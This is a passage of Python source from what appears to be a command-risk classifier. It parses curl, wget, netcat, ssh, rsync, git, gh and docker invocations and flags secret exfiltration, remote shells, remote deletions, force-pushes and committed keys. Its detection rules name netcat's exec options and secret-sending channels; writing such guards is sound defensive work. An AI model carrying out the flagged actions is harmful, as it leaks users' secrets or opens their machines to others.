             "--referer", "-b", "--cookie", "-c", "--cookie-jar", "-K", "--config", "--url", "-x",
             "--proxy", "-w",
             "--write-out", "-m", "--max-time", "--connect-timeout", "-r", "--range", "-C", "--retry", "-E",
             "--cert", "--key", "--cacert", "--resolve", "--interface", "-D", "--dump-header", "--trace",
             "--trace-ascii", "--stderr", "-Y", "-y", "--limit-rate", "--output-dir", "-z", "-T",
             "--upload-file",
             "--max-filesize", "--retry-delay", "--retry-max-time", "-U", "--proxy-user",
             "--oauth2-bearer", "-Q",
             "--quote", *CURL_DATA, *CURL_FORM}


def h_curl(argv, ctx, stdin):
    opts, pos = options(argv[1:], CURL_ARGS)
    urls = pos + values(opts, "--url")
    data, files = [], []
    for value in values(opts, *CURL_DATA):
        if value.startswith("@"):
            files.append(arg(value[1:], value.marks))
        else:
            data.append(value)
    for value in values(opts, *CURL_FORM):
        _, _, v = value.partition("=")
        if v.startswith(("@", "<")):
            files.append(arg(v[1:].split(";")[0], value.marks))
        else:
            data.append(value)
    files += values(opts, "-T", "--upload-file")
    read_paths(values(opts, "-K", "--config"), ctx)
    for value in values(opts, "-H", "--header", "-b", "--cookie", "-u", "--user", "-A", "--user-agent", "-e",
                        "--referer"):
        if "secret" in value.marks:
            data.append(value)
    method = (values(opts, "-X", "--request") or [arg("GET")])[0].upper()
    sends = bool(data or files) or method in ("POST", "PUT", "PATCH", "DELETE")
    outputs = values(opts, "-o", "--output")
    for out in [o for o in outputs if o != "-"]:
        save_download(out, ctx)
    if has(opts, "-O", "--remote-name"):
        for u in urls:
            save_download(arg(os.path.basename(u.split("?")[0].rstrip("/")) or "index.html"), ctx)
    for out in values(opts, "-c", "--cookie-jar", "-D", "--dump-header", "--trace", "--trace-ascii",
                      "--stderr"):
        if out != "-":
            write_paths([out], ctx)
    egress_payload(ctx, "curl", data, files, urls, stdin, sends)
    remote_delete(ctx, "curl", method, urls)
    if not sends and (not outputs or "-" in outputs) and not has(opts, "-O", "--remote-name", "-I", "--head"):
        ctx.marks.add("download")
        return Stage(downloads=True)
    return Stage()


def remote_delete(ctx: Ctx, program: str, method: str, urls: list[Arg]) -> None:
    """An HTTP DELETE to another computer removes something there, like `gh api -X DELETE`."""
    if method != "DELETE":
        return
    for u in urls or [arg(UNKNOWN)]:
        host = re.sub(r"^[a-z+.-]+://", "", str(u)).split("/")[0].split("@")[-1]
        host = re.sub(r":\d+$", "", host)
        if UNKNOWN in host or not LOCAL_HOSTS.match(host):
            where = host if UNKNOWN not in host else "a server"
            ctx.add("remote-irreversible", f"Deletes something on {where} through its API "
                                           f"({program} DELETE).")
            return


def save_download(target: Arg, ctx: Ctx) -> None:
    write_paths([target], ctx, "saves a download to")
    path = ctx.where.resolve(target, ctx.cwd)
    if path:
        ctx.downloaded.add(path)


def h_wget(argv, ctx, stdin):
    with_arg = {"-O", "--output-document", "-o", "--output-file", "-a", "--append-output", "-P",
                "--directory-prefix", "-i", "--input-file", "--post-data", "--post-file", "--body-data",
                "--body-file", "--method", "--header", "-U", "--user-agent", "--user", "--password", "-t",
                "--tries", "-T", "--timeout", "-e", "--execute", "-Q", "--quota", "-l", "--level"}
    opts, pos = options(argv[1:], with_arg)
    data = values(opts, "--post-data", "--body-data")
    files = values(opts, "--post-file", "--body-file")
    sends = bool(data or files) or any(v.upper() in ("POST", "PUT", "DELETE", "PATCH")
                                       for v in values(opts, "--method"))
    read_paths(values(opts, "-i", "--input-file"), ctx)
    write_paths(values(opts, "-o", "--output-file", "-a", "--append-output"), ctx)
    outputs = values(opts, "-O", "--output-document")
    for out in [o for o in outputs if o != "-"]:
        save_download(out, ctx)
    if not outputs:
        base = (values(opts, "-P", "--directory-prefix") or [arg(".")])[0]
        for u in pos:
            save_download(arg(base.rstrip("/") + "/" + (os.path.basename(u.split("?")[0].rstrip("/"))
                                                        or "index.html")), ctx)
    egress_payload(ctx, "wget", data, files, pos, stdin, sends)
    remote_delete(ctx, "wget", (values(opts, "--method") or [arg("GET")])[0].upper(), pos)
    if "-" in outputs and not sends:
        ctx.marks.add("download")
        return Stage(downloads=True)
    return Stage()


def h_httpie(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-a", "--auth", "-o", "--output", "--session", "-A", "--auth-type",
                                   "--verify", "--cert", "--cert-key", "--proxy"})
    method = ""
    if pos and pos[0].upper() in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
        method, pos = pos[0].upper(), pos[1:]
    urls, items = pos[:1], pos[1:]
    data, files = [], []
    for item in items:
        m = re.match(r"^[^=:@]*(:=@|=@|@|:=|==|=|:)(.*)$", item)
        if not m:
            continue
        if m.group(1) in ("@", "=@", ":=@"):
            files.append(arg(m.group(2), item.marks))
        elif m.group(1) != ":" or "secret" in item.marks:
            data.append(item)
    write_paths(values(opts, "-o", "--output"), ctx)
    sends = bool(data or files) or method in ("POST", "PUT", "PATCH", "DELETE")
    egress_payload(ctx, argv[0], data, files, urls, stdin, sends)
    remote_delete(ctx, argv[0], method, urls)
    if not sends:
        ctx.marks.add("download")
        return Stage(downloads=True)
    return Stage()


def h_netcat(argv, ctx, stdin):
    program = argv[0]
    joined = " ".join(argv[1:])
    if re.search(r"(?:^|\s)-[a-zA-Z]*[ec](?:\s|$)|--exec|--sh-exec|--lua-exec|\bexec:|\bsystem:", joined):
        ctx.add("remote-shell", f"`{program}` hands a program to the network: whoever connects can run "
                                f"commands "
                                "on this computer.")
        return Stage()
    if stdin is not None and stdin.secret:
        ctx.add("egress-secret", f"Sends a secret over a raw network connection with {program}.")
        return Stage()
    ctx.add("egress", f"Opens a raw network connection with {program}.")
    return Stage()


def h_ssh(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-i", "-p", "-l", "-o", "-F", "-J", "-L", "-R", "-D", "-b", "-c", "-E",
                                   "-e",
                                   "-m", "-O", "-Q", "-S", "-W", "-w", "-B", "-I"}, first_stops=True)
    if not pos:
        ctx.add("exec", "Runs ssh.")
        return Stage()
    host, command = pos[0], pos[1:]
    for value in values(opts, "-o"):
        if re.match(r"(?i)(ProxyCommand|LocalCommand|PermitLocalCommand|KnownHostsCommand)", value):
            ctx.add("risky", f"`ssh -o {value.split('=')[0]}` runs a local command.")
    if stdin is not None and stdin.secret:
        ctx.add("egress-secret", f"Sends a secret to {host} over ssh.")
    if any("secret" in c.marks for c in command):
        ctx.add("egress-secret", f"Sends a secret it reads to {host} over ssh.")
    if command:
        remote(arg(" ".join(command), joined_marks(command)), ctx, f"on {host}")
    else:
        ctx.add("exec", f"Opens a shell on {host}.")
    return Stage()


def remote(script: Arg, ctx: Ctx, where: str) -> None:
    """Commands that run on another machine or in a container: anything risky there is asked about."""
    inner = ctx.child(findings=[])
    inner.cwd = None
    shell_string(script, inner, [], where)
    for f in inner.findings:
        if LEVEL[TABLE.get(f.cls, (ASK,) * 3)[1]] >= LEVEL[ASK]:
            if f.cls in ("egress-secret", "remote-shell", "fork-bomb"):
                ctx.add(f.cls, f"{where}: {f.reason}")
            else:
                ctx.add("remote-command", f"{where}: {f.reason}")
    ctx.add("exec", f"Runs commands {where}.")


def h_scp(argv, ctx, stdin):
    program = argv[0]
    if program == "rsync":
        with_arg = {"-e", "--rsh", "--exclude", "--include", "--exclude-from", "--include-from",
                    "--files-from",
                    "-f", "--filter", "--chmod", "--chown", "--rsync-path", "--log-file", "-T", "--temp-dir",
                    "--backup-dir", "--suffix", "--partial-dir", "--password-file", "--port", "-B",
                    "--block-size"}
    else:
        with_arg = {"-i", "-P", "-p", "-o", "-F", "-J", "-c", "-l", "-S", "-D", "-X"}
    opts, pos = options(argv[1:], with_arg)
    if len(pos) < 2:
        ctx.add("exec", f"Runs {program}.")
        return Stage()
    sources, dest = pos[:-1], pos[-1]
    remote_dest = bool(HOST_ARG.match(dest)) or dest.startswith("rsync://")
    local_sources = [s for s in sources if not HOST_ARG.match(s) and not s.startswith("rsync://")]
    deleting = program == "rsync" and has(opts, "--delete", "--delete-before", "--delete-after",
                                          "--delete-during", "--delete-excluded")
    if remote_dest:
        egress_payload(ctx, program, [], local_sources, [arg(dest)], stdin, True)
        if deleting:
            ctx.add("remote-irreversible", f"`rsync --delete` removes files on {dest.split(':')[0]} that "
                                           f"are not "
                                           "in the source.")
    else:
        read_paths(local_sources, ctx, "copies")
        if deleting or has(opts, "--remove-source-files"):
            delete_paths([arg(dest.rstrip("/") + "/_")] if deleting else local_sources, ctx,
                         "removes files in")
        write_paths([arg(dest.rstrip("/") + "/_") if dest.endswith("/") else dest], ctx, "copies files to")
        if len(local_sources) < len(sources):
            ctx.add("egress", "Copies files from another computer.")
    return Stage()


def h_mail(argv, ctx, stdin):
    if stdin is not None and stdin.secret:
        ctx.add("egress-secret", f"Emails a secret with {argv[0]}.")
    else:
        ctx.add("egress", f"Sends an email with {argv[0]}.")
    return Stage()


# ---------------------------------------------------------------- git

GIT_READ = {"status", "log", "diff", "show", "blame", "shortlog", "describe", "rev-parse", "rev-list",
            "ls-files",
            "ls-tree", "ls-remote", "cat-file", "grep", "merge-base", "name-rev", "for-each-ref", "show-ref",
            "show-branch", "whatchanged", "count-objects", "check-ignore", "check-attr", "cherry",
            "range-diff",
            "help", "version", "--version", "annotate", "verify-commit", "verify-tag", "fsck", "var",
            "diff-tree",
            "diff-index", "diff-files", "show-index", "get-tar-commit-id"}
GIT_WRITE = {"mv", "init", "apply", "am", "cherry-pick", "merge", "revert", "commit-tree", "update-index",
             "pull", "fetch", "sparse-checkout", "format-patch", "archive", "bundle", "pack-refs", "prune",
             "repack", "replace", "lfs", "update-ref", "symbolic-ref", "mergetool", "difftool", "citool",
             "gui",
             "rerere", "rm", "send-email", "daemon", "request-pull", "fast-import", "fast-export",
             "hash-object",
             "mktree", "mktag", "read-tree", "write-tree", "checkout-index", "unpack-objects", "init-db",
             "maintenance", "instaweb"}


def h_git(argv, ctx, stdin, depth: int = 0):
    args = list(argv[1:])
    gctx = ctx
    while args and args[0].startswith("-"):
        a = args.pop(0)
        if a == "-C" and args:
            gctx = ctx.child()
            gctx.findings = ctx.findings
            gctx.cwd = ctx.where.resolve(args.pop(0), ctx.cwd)
        elif a == "-c" and args:
            key, _, value = args.pop(0).partition("=")
            if key.lower().startswith("alias."):
                ctx.git_aliases = {**ctx.git_aliases, key[6:].lower(): value}
            elif runs_program(key, value):
                ctx.add("risky", f"`git -c {key}=...` makes git run another program.")
        elif a.startswith(("--exec-path=", "--config-env")):
            ctx.add("risky", f"`git {a.split('=')[0]}` makes git run programs from elsewhere.")
        elif a in ("--git-dir", "--work-tree", "--namespace", "--super-prefix", "--exec-path") and args:
            args.pop(0)
    if not args:
        ctx.add("read", "Shows git help.")
        return Stage()
    sub, rest = args[0], args[1:]
    if sub not in GIT_READ and sub not in GIT_WRITE and sub not in GIT_SUBS and depth < 4:
        alias = ctx.git_aliases.get(sub.lower()) or ctx.git.aliases().get(sub.lower())
        if alias:
            if alias.startswith("!"):
                return shell_string(arg(alias[1:] + " " + " ".join(shquote(r) for r in rest)), gctx, [],
                                    f"git {sub}")
            return h_git([arg("git"), *[arg(w) for w in alias.split()], *rest], gctx, stdin, depth + 1)
    handler = GIT_SUBS.get(sub)
    if handler:
        before = len(gctx.findings)
        out = handler(sub, rest, gctx, stdin) or Stage()
        # checkout, reset ... after `cd`/`git -C` elsewhere rewrite files outside the project (#141)
        if sub in GIT_WORKTREE and not gctx.in_project() and \
                any(f.cls != "read" for f in gctx.findings[before:]):
            git_elsewhere(sub, ctx, gctx)
        return out
    if sub in GIT_READ:
        outputs = [arg(r.split("=", 1)[1]) for r in rest if r.startswith("--output=")]
        write_paths(outputs, gctx)
        if sub == "diff" and "--no-index" in rest:
            read_paths([r for r in rest if not r.startswith("-")], gctx)
        for r in rest:
            rev, colon, inside = r.partition(":")
            if colon and inside and not r.startswith("-") and "://" not in r and \
                    ctx.where.is_secret(ctx.where.root + "/" + inside.lstrip("/")):
                gctx.add("secret-read", f"Shows {inside} from git history, which holds secrets (keys, "
                                        "tokens or passwords), in the conversation.", inside)
        if sub in ("diff", "log", "show") and any(r in ("--ext-diff", "--textconv") for r in rest):
            gctx.add("risky", f"`git {sub} --ext-diff` runs a program named in the git settings.")
        gctx.add("read", f"Only shows information (git {sub}).")
        return Stage(paths_root=gctx.cwd, filtered=True) if sub in ("ls-files", "grep", "diff") else Stage()
    if sub in GIT_WRITE:
        if sub in ("pull", "fetch") or sub == "send-email":
            gctx.add("egress", f"Talks to a remote repository (git {sub}).")
        if gctx.in_project() or sub == "fetch":  # fetch only adds what the remote has: wherever it runs
            gctx.add("write", f"Changes the repository (git {sub}).")
        else:
            git_elsewhere(sub, ctx, gctx)
        return Stage()
    gctx.add("exec", f"Runs git {sub}.")
    return Stage()


GIT_WORKTREE = {"checkout", "switch", "restore", "reset", "clean"}


def git_elsewhere(sub: str, ctx: Ctx, gctx: Ctx) -> None:
    if ctx.where.place(gctx.cwd) == "temp":
        gctx.add("write-temp", f"Changes a repository in a temporary folder (git {sub}).")
    else:
        # the repository's folder as the target, so a folder the user approved covers it (#210)
        gctx.add("write-outside", f"Changes a repository outside the project (git {sub}).",
                 gctx.cwd.rstrip("/") + "/" if gctx.cwd else "")


def protected_branches(ctx: Ctx) -> list[str]:
    extra = [b for b in ctx.config.get("protected_branches") or [] if isinstance(b, str)]
    default = ctx.git.default()
    return [*DEFAULT_PROTECTED, *([default] if default else []), *extra]


def branch_matches(branch: str, patterns: list[str]) -> bool:
    return any(branch == p or fnmatch.fnmatch(branch, p) for p in patterns)


def git_push(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"--repo", "-o", "--push-option", "--receive-pack", "--exec"})
    force = has(opts, "-f", "--force", "--force-with-lease", "--force-if-includes")
    refspecs = pos[1:]
    force = force or any(r.startswith("+") for r in refspecs)
    remote_name = pos[0] if pos else "origin"
    if values(opts, "--receive-pack", "--exec"):
        ctx.add("risky", "`git push --receive-pack` runs a chosen program on the server.")
    if has(opts, "--no-verify"):
        ctx.add("skip-checks", "`git push --no-verify` skips the repository's push checks.")
    if has(opts, "--mirror", "--prune"):
        ctx.add("remote-irreversible", f"`git push {'--mirror' if has(opts, '--mirror') else '--prune'}` "
                                       f"deletes "
                                       f"branches on {remote_name} that are not here.")
    deleting = has(opts, "-d", "--delete") or any(r.startswith(":") and len(r) > 1 for r in refspecs)
    if deleting:
        names = [r.lstrip(":") for r in refspecs]
        ctx.add("remote-irreversible", f"Deletes {', '.join(names) or 'a branch'} on {remote_name}.")
    elif has(opts, "--tags", "--follow-tags") or any(TAG_LIKE.match(r.lstrip("+").split(":")[-1])
                                                      for r in refspecs):
        ctx.add("remote-irreversible", f"Pushes a tag to {remote_name}, which often starts a release.")
    if force and not deleting:
        dests = [r.lstrip("+").split(":")[-1] for r in refspecs if r.lstrip("+")] or [ctx.git.branch()]
        dests = [d.removeprefix("refs/heads/") for d in dests]
        protected = protected_branches(ctx)
        hit = [d for d in dests if d and (branch_matches(d, protected) or RELEASE_LINE.match(d))]
        if hit:
            ctx.add("force-push-protected", f"Force-pushes to '{hit[0]}', a shared branch: it rewrites "
                                            f"history "
                                            "other people rely on. Push to your own branch and open a pull "
                                            "request instead.")
        else:
            ctx.add("history-rewrite", f"Force-pushes {', '.join(d for d in dests if d) or 'this branch'}, "
                                       "replacing what is on the remote.")
    if stdin is not None and stdin.secret:
        ctx.add("egress-secret", "Sends a secret with git push.")
    ctx.add("egress", f"Sends commits to {remote_name}.")
    return Stage()


def git_commit(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"-m", "--message", "-F", "--file", "-C", "-c", "--author", "--date", "--fixup",
                               "--squash", "-t", "--template", "--trailer", "--cleanup", "--reuse-message"})
    if has(opts, "-n", "--no-verify"):
        ctx.add("skip-checks", "`git commit --no-verify` skips the pre-commit checks.")
    if has(opts, "--dry-run"):
        ctx.add("read", "Shows what would be committed.")
        return Stage()
    if ctx.git.dirs():
        names = ctx.git.run("diff", "--cached", "--name-only", "--no-ext-diff")
        diff = ctx.git.run("diff", "--cached", "--no-ext-diff", "--no-textconv", "--no-color", "-U0")
        if has(opts, "-a", "--all") or pos:
            names += ctx.git.run("diff", "--name-only", "--no-ext-diff")
            diff += ctx.git.run("diff", "--no-ext-diff", "--no-textconv", "--no-color", "-U0")
        bad = [n for n in names.splitlines() if n.strip() and ctx.where.is_secret(ctx.where.root + "/" + n)]
        if bad:
            ctx.add("commit-secret-file", f"This commit includes {bad[0]}, which usually holds secrets. "
                                          f"Unstage it "
                                          f"(git restore --staged {bad[0]}) and add it to .gitignore.")
        added = "\n".join(ln[1:] for ln in diff.splitlines()
                          if ln.startswith("+") and not ln.startswith("+++"))
        if any(p.search(added) for p in secrets.PATTERNS):
            ctx.add("commit-secret", "The staged changes contain what looks like a real key or token. Load "
                                     "it "
                                     "from an environment variable or a secret store instead.")
    ctx.add("write", "Records a commit.")
    return Stage()


def git_add(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"--chmod", "--pathspec-from-file"})
    for p in pos:
        path = ctx.where.resolve(p, ctx.cwd)
        if path and ctx.where.is_secret(path) and not os.path.isdir(path):
            ctx.add("commit-secret", f"Stages {ctx.show(path)}, which usually holds secrets, for a "
                                     f"commit.", path)
    ctx.add("write", "Stages changes.")
    return Stage()


def git_reset(sub, rest, ctx, stdin):
    if "--hard" in rest and ctx.git.dirs() and ctx.git.dirty():
        ctx.add("discard", "`git reset --hard` throws away your uncommitted changes for good.")
    else:
        ctx.add("write", "Moves the branch (git reset).")
    return Stage()


def git_checkout(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"-b", "-B", "--orphan", "-c", "-C", "--conflict", "--pathspec-from-file",
                               "-s", "--source"})
    forced = has(opts, "-f", "--force", "--discard-changes")
    if sub == "restore":
        paths = pos
        discards = not has(opts, "-S", "--staged") or has(opts, "-W", "--worktree")
    else:
        paths = rest[rest.index("--") + 1:] if "--" in rest else [p for p in pos if p in (".", "*", ":/")]
        discards = bool(paths) and not has(opts, "-b", "-B", "-c", "-C", "--orphan")
    if (forced or (discards and paths)) and ctx.git.dirs() and ctx.git.dirty():
        ctx.add("discard", f"`git {sub}` here throws away uncommitted changes for good.")
    else:
        ctx.add("write", f"Switches or restores files (git {sub}).")
    return Stage()


def git_clean(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"-e", "--exclude"})
    if has(opts, "-n", "--dry-run"):
        ctx.add("read", "Shows what git clean would delete.")
    elif has(opts, "-f", "--force"):
        ctx.add("discard", "`git clean -f` permanently deletes files git does not track (and ignored ones "
                           "with "
                           "-x).")
    else:
        ctx.add("read", "git clean without -f does nothing.")
    return Stage()


def git_branch(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"-u", "--set-upstream-to", "--contains", "--no-contains", "--merged",
                               "--no-merged", "--sort", "--format", "--points-at"})
    if has(opts, "-D") or (has(opts, "-d", "--delete") and has(opts, "-f", "--force")):
        if pos and not has(opts, "-r", "--remotes") and all(work_on_a_remote(b, ctx) for b in pos):
            ctx.add("write", "Deletes branches whose work is on the remote (pushed, or merged and its remote "
                             "branch deleted).")
        else:
            ctx.add("discard", "`git branch -D` deletes a branch even if its work was never merged.")
    elif pos or has(opts, "-d", "--delete", "-m", "-M", "-c", "-C", "-u", "--set-upstream-to",
                    "--unset-upstream"):
        ctx.add("write", "Changes branches.")
    else:
        ctx.add("read", "Lists branches.")
    return Stage()


def work_on_a_remote(branch: str, ctx: Ctx) -> bool:
    """A local branch with no work of its own (#210): its upstream is gone, as after a squash-merged PR
    whose branch was deleted, or every commit on it is on some remote branch."""
    if UNKNOWN in branch or not ctx.cwd:
        return False
    tree = ctx.where.project_of(ctx.cwd + "/_")
    if not tree:
        return False
    git = ctx.git if tree == ctx.where.root else Git(tree)
    ref = f"refs/heads/{branch}"
    listed = git.try_run("for-each-ref", "--format=%(refname)%00%(upstream:track)", ref) or ""
    track = next((line.split("\0", 1)[1] for line in listed.splitlines()
                  if line.split("\0", 1)[0] == ref and "\0" in line), None)
    if track is None:
        return False
    if track == "[gone]":
        return True
    return git.try_run("rev-list", "--max-count=1", ref, "--not", "--remotes", "--") == ""


GIT_LIST_READS = {"tag": {"", "-l", "--list", "-n", "--contains", "--points-at", "--sort", "-v", "--verify"},
                  "stash": {"list", "show"}, "remote": {"", "-v", "--verbose", "show", "get-url"},
                  "worktree": {"list"}, "reflog": {"", "show", "exists"}, "notes": {"", "list", "show"}}


def git_listing(sub, rest, ctx, stdin):
    """tag, stash, remote, worktree, reflog, notes: listing is a read, the rest changes the repo."""
    first = rest[0] if rest else ""
    if first in GIT_LIST_READS.get(sub, set()):
        ctx.add("read", f"Only shows information (git {sub} {first}).")
    elif sub == "stash" and first in ("drop", "clear"):
        ctx.add("discard", f"`git stash {first}` deletes saved work for good.")
    elif sub == "worktree" and first == "remove" and ("--force" in rest or "-f" in rest):
        ctx.add("discard", "`git worktree remove --force` deletes a worktree with its uncommitted changes.")
    elif sub == "reflog" and first in ("expire", "delete"):
        ctx.add("discard", f"`git reflog {first}` removes the record git uses to recover lost work.")
    else:
        ctx.add("write", f"Changes the repository (git {sub} {first}).")
    return Stage()


def git_config(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"-f", "--file", "--blob", "--type", "--default"})
    if pos and pos[0] in ("get", "list"):
        ctx.add("read", "Shows git settings.")
        return Stage()
    if pos and pos[0] in ("set", "unset"):
        pos = pos[1:]
    changes = has(opts, "--unset", "--unset-all", "--add", "--replace-all", "--remove-section",
                  "--rename-section",
                  "-e", "--edit")
    if has(opts, "--get", "--get-all", "--get-regexp", "-l", "--list",
           "--get-urlmatch") or (len(pos) < 2 and not
                                                                                              changes):
        ctx.add("read", "Shows git settings.")
        return Stage()
    key = pos[0] if pos else ""
    value = pos[1] if len(pos) > 1 else ""
    is_alias = key.lower().startswith("alias.")
    if runs_program(key, value) and (not is_alias or value.startswith("!")):
        ctx.add("persistence", f"Sets git's {key}, which makes git run a program later on its own.")
    elif has(opts, "--global", "--system") or values(opts, "-f", "--file"):
        write_paths(values(opts, "-f", "--file") or [arg("~/.gitconfig")], ctx, "changes git settings in")
    else:
        ctx.add("write", f"Changes the project's git setting {key}.")
    return Stage()


def runs_program(key: str, value: str) -> bool:
    """A git setting that makes git run a program. core.hooksPath=/dev/null runs none: it only switches the
    hooks off, which the maintainer decided is not worth an ask (#267)."""
    if key.lower() == "core.hookspath" and value in ("/dev/null", "NUL", "nul"):
        return False
    return bool(GIT_EXEC_KEYS.match(key))


def git_runs(sub, rest, ctx, stdin):
    """submodule foreach, bisect run, rebase --exec: they run commands."""
    if sub == "submodule" and rest[:1] == ["foreach"]:
        cmd = [r for r in rest[1:] if r not in ("--recursive", "-q", "--quiet")]
        return shell_string(arg(" ".join(cmd), joined_marks(cmd)), ctx, [], "git submodule foreach")
    if sub == "bisect" and rest[:1] == ["run"]:
        return run(rest[1:], ctx, stdin)
    if sub == "rebase":
        opts, _ = options(rest, {"-x", "--exec", "--onto", "-s", "--strategy", "-X", "--strategy-option"})
        for cmd in values(opts, "-x", "--exec"):
            shell_string(cmd, ctx, [], "git rebase --exec")
    ctx.add("write", f"Changes the repository (git {sub}).")
    return Stage()


def git_rewrite(sub, rest, ctx, stdin):
    ctx.add("history-rewrite", f"`git {sub}` rewrites the whole history of the repository.")
    return Stage()


def git_gc(sub, rest, ctx, stdin):
    if any(r.startswith("--prune=now") or r == "--prune=all" for r in rest):
        ctx.add("discard", "`git gc --prune=now` removes lost work git could otherwise still recover.")
    else:
        ctx.add("write", "Tidies the repository (git gc).")
    return Stage()


def git_credential(sub, rest, ctx, stdin):
    if not rest or rest[0] in ("fill", "get"):
        ctx.add("secret-read", "Asks git for a stored password or token.")
    else:
        ctx.add("write", f"Changes stored git credentials (git {sub}).")
    return Stage()


def git_clone(sub, rest, ctx, stdin):
    opts, pos = options(rest, {"-b", "--branch", "-o", "--origin", "--depth", "-c", "--config", "--reference",
                               "-j", "--jobs", "--filter", "-u", "--upload-pack", "--template",
                               "--separate-git-dir"})
    for value in values(opts, "-c", "--config"):
        if GIT_EXEC_KEYS.match(value.split("=")[0]):
            ctx.add("risky", "`git clone -c` sets a git option that runs a program.")
    if values(opts, "-u", "--upload-pack"):
        ctx.add("risky", "`git clone --upload-pack` runs a chosen program.")
    if pos:
        url = pos[0]
        name = os.path.basename(url.rstrip("/")).removesuffix(".git") or "repo"
        dest = pos[1] if len(pos) > 1 else arg(name)
        if re.search(r"://[^/\s:@]+:[^/\s@]+@", url):
            ctx.add("egress-risk", "Puts a password or token in the clone address.")
        write_paths([dest], ctx, "clones into")
    ctx.add("egress", "Downloads a repository.")
    return Stage()


GIT_SUBS = {"push": git_push, "commit": git_commit, "add": git_add, "stage": git_add, "reset": git_reset,
            "checkout": git_checkout, "restore": git_checkout, "switch": git_checkout, "clean": git_clean,
            "branch": git_branch, "tag": git_listing, "stash": git_listing, "remote": git_listing,
            "worktree": git_listing, "reflog": git_listing, "notes": git_listing, "config": git_config,
            "submodule": git_runs, "bisect": git_runs, "rebase": git_runs, "filter-branch": git_rewrite,
            "filter-repo": git_rewrite, "gc": git_gc, "credential": git_credential,
            "credential-store": git_credential, "credential-cache": git_credential, "clone": git_clone}


# ---------------------------------------------------------------- hosting, registries, infrastructure

GH_IRREVERSIBLE = {
    ("pr", "merge"): "Merges a pull request: the work lands in the shared branch for everyone.",
    ("mr", "merge"): "Merges a merge request: the work lands in the shared branch for everyone.",
    ("repo", "delete"): "Deletes a whole repository with its issues and history.",
    ("repo", "archive"): "Archives the repository (it becomes read-only for everyone).",
    ("repo", "rename"): "Renames the repository, which breaks other people's links and clones.",
    ("repo", "transfer"): "Moves the repository to another owner.",
    ("release", "create"): "Publishes a release that people download.",
    ("release", "delete"): "Deletes a published release.",
    ("release", "upload"): "Adds files to a published release.",
    ("release", "edit"): "Changes a published release.",
    ("issue", "delete"): "Deletes an issue for good.",
    ("secret", "set"): "Changes a secret used by the repository's automation.",
    ("secret", "delete"): "Deletes a secret used by the repository's automation.",
    ("secret", "remove"): "Deletes a secret used by the repository's automation.",
    ("variable", "delete"): "Deletes a variable used by the repository's automation.",
    ("run", "delete"): "Deletes workflow run records.",
    ("cache", "delete"): "Deletes the repository's build caches.",
    ("ruleset", "delete"): "Deletes branch protection rules.",
    ("project", "delete"): "Deletes a project board.",
    ("gist", "delete"): "Deletes a gist.",
    ("label", "delete"): "Deletes a label from every issue.",
}
GH_ARGS = {"-R", "--repo", "-b", "--body", "-t", "--title", "-F", "--body-file", "-f", "--field",
           "--raw-field",
           "-X", "--method", "-H", "--header", "--input", "-q", "--jq", "--json", "-l", "--label", "-a",
           "--assignee", "-B", "--base", "-m", "--milestone", "-L", "--limit", "-s", "--state", "--template",
           "-n", "--notes", "--target", "-p", "--project", "-e", "--env", "--org", "-u", "--user",
           "--visibility",
           "-d", "--description", "-o", "--output", "--hostname", "--head", "--search", "-A", "--author",
           "--reviewer", "-r"}


def h_gh(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], GH_ARGS)
    group = pos[0] if pos else ""
    action = pos[1] if len(pos) > 1 else ""
    if group == "auth" and (action == "token" or has(opts, "-t", "--show-token")):
        ctx.add("secret-read", f"Prints your {program} login token into the conversation.")
        return Stage()
    if (group, action) in GH_IRREVERSIBLE:
        ctx.add("remote-irreversible", GH_IRREVERSIBLE[(group, action)])
        return Stage()
    if (group, action) == ("workflow", "run") and pos[2:3] and RELEASE_WORDS.search(pos[2]):
        ctx.add("remote-irreversible", f"Starts the workflow {pos[2]}, which by its name deploys, publishes "
                                       "or releases something.")
        return Stage()
    if group == "repo" and action == "edit" and has(opts, "--visibility"):
        ctx.add("remote-irreversible", "Changes who can see the repository.")
        return Stage()
    if group == "api":
        fields = values(opts, "-f", "--field", "-F", "--raw-field")
        body = bool(fields or values(opts, "--input"))
        method = (values(opts, "-X", "--method") or [arg("POST" if body else "GET")])[0].upper()  # as gh
        if method != "GET" or body:
            api = "GraphQL API" if pos[1:2] == ["graphql"] else "raw API"
            ctx.add("remote-irreversible", f"Changes data on {program} through the {api} ({method}).")
            egress_payload(ctx, program, fields, values(opts, "--input"), [], stdin, True)
            return Stage()
        ctx.add("egress", f"Reads data from the {program} API.")
        return Stage()
    if group == "gist" and action == "create":
        egress_payload(ctx, program, [], pos[2:], [arg("gist.github.com")], stdin, True)
        return Stage()
    if group in ("pr", "issue", "mr") and action in ("create", "comment", "edit", "review", "note"):
        egress_payload(ctx, program, values(opts, "-b", "--body", "-t", "--title"),
                       values(opts, "-F", "--body-file"), [arg(program)], stdin, True)
        return Stage()
    if action in ("view", "list", "diff", "checks", "status", "watch", "ls", "download") or \
            group in ("status", "--version", "version", "help", "browse", "search") or \
            (group == "auth" and action == "status"):
        ctx.add("read", f"Only shows information ({program} {group} {action}).")
        return Stage()
    if {p.lower() for p in pos[:3]} & {"delete", "remove", "rm", "destroy"}:
        ctx.add("remote-irreversible", f"Deletes something on {program} ({group} {action}).")
        return Stage()
    ctx.add("egress", f"Changes something on {program} ({group} {action}).")
    return Stage()


def h_docker(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], {"-H", "--host", "--context", "-c", "--config", "-l", "--log-level"},
                        first_stops=True)
    if program == "docker-compose":
        return docker_compose(program, pos, ctx)
    sub = pos[0] if pos else ""
    rest = pos[1:]
    if sub == "compose":
        return docker_compose(program, rest, ctx)
    if sub == "push":
        ctx.add("remote-irreversible", f"`{program} push` publishes an image to a registry.")
    elif sub in ("run", "create"):
        docker_run(rest, ctx)
    elif sub == "exec":
        o, p = options(rest, {"-e", "--env", "-u", "--user", "-w", "--workdir", "--env-file",
                              "--detach-keys"},
                       first_stops=True)
        if has(o, "--privileged"):
